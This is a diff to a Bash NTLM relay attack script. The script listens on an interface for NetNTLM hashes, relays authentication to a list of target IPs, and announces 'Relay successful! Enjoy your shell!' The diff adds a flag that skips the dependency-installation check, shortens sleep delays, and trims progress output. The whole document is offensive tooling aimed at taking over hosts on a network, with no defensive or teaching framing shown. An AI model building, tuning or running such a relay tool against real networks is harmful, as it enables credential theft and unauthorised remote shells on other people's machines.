@@ -69,6 +69,7 @@ function helpMenu(){
 		echo -e "\t${purpleColour}i) Interface to listen for NetNTLM hashes${endColour}\n"
 		echo -e "\t${purpleColour}t) File path to the list of targets (IP addresses one per line)${endColour}\n"
 		echo -e "\t${purpleColour}r) Remove all installed software${endColour}\n"
+		echo -e "\t${purpleColour}d) Discard the installation process${endColour}\n"
 		echo -e "\t${purpleColour}q) Shhh! be quiet...${endColour}\n"
 		echo -e "\t${purpleColour}h) Shows this help menu${endColour}\n"
 	goodExit
@@ -275,11 +276,11 @@ function relayingAttack(){
 
 	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to locate terminal in the system. Existing...\n"; badExit; fi
 
-	sleep 3
+    sleep 0.5
 
 	portStatus=$(netstat -tunalp | grep $lport | awk '{print $6}' | sort -u)
 	while [ "$portStatus" == "LISTEN" ];do
-		portStatus=$(netstat -tnualp | grep $lport | awk '{print $6}' | sort -u); sleep 1
+		portStatus=$(netstat -tnualp | grep $lport | awk '{print $6}' | sort -u);
 	done
 
 	rhost=$(netstat -tnualp | grep $lport | awk '{print $5}' | tail -1 | awk -F: '{print $1}')
@@ -287,8 +288,7 @@ function relayingAttack(){
 	while read line; do if [ "$rhost" == "$line" ];then checkrhost=1; fi; done < $targets
 
 	if [[ "$portStatus" == "ESTABLISHED" && $checkrhost -eq 1 ]];then
-		echo -ne "${blueColour}[:*]${endColour} Authenticating to target $rhost "
-		for i in {1..3}; do sleep 0.5; echo -ne "."; done
+		echo -ne "${blueColour}[:*]${endColour} Authenticating to target $rhost ..."
 		echo -e "\n\n${greenColour}[:D]${endColour} Relay successful! Enjoy your shell!\n"; sleep 0.5
 	else
 		echo -e "${redColour}[:(]${endColour} Relay unsuccessful! May be you need more coffee\n"; sleep 0.5
@@ -353,15 +353,17 @@ if [ "$(id -u)" == 0 ]; then
 	tput civis
 	quiet='1'
 	remove=''
+    discard=0
 	declare -i parameter_counter=0;
 	
-	while getopts "qri:t:h" arg; do
+	while getopts "qri:t:hd" arg; do
 		case $arg in
 			q) quiet='';;
 			r) remove='1';;
 			i) interface=$OPTARG; let parameter_counter+=1 ;;
 			t) targets=$OPTARG; let parameter_counter+=1 ;;
 			h) helpMenu;;
+            d) discard=1;;
 		esac
 	done
 
@@ -383,7 +385,7 @@ if [ "$(id -u)" == 0 ]; then
 			done < $targets
 		fi
 
-		checkProgramsNeeded
+		if [ $discard == 0 ];then checkProgramsNeeded; fi
 		checkTargets
 		checkResponderConfig
 		relayingAttack
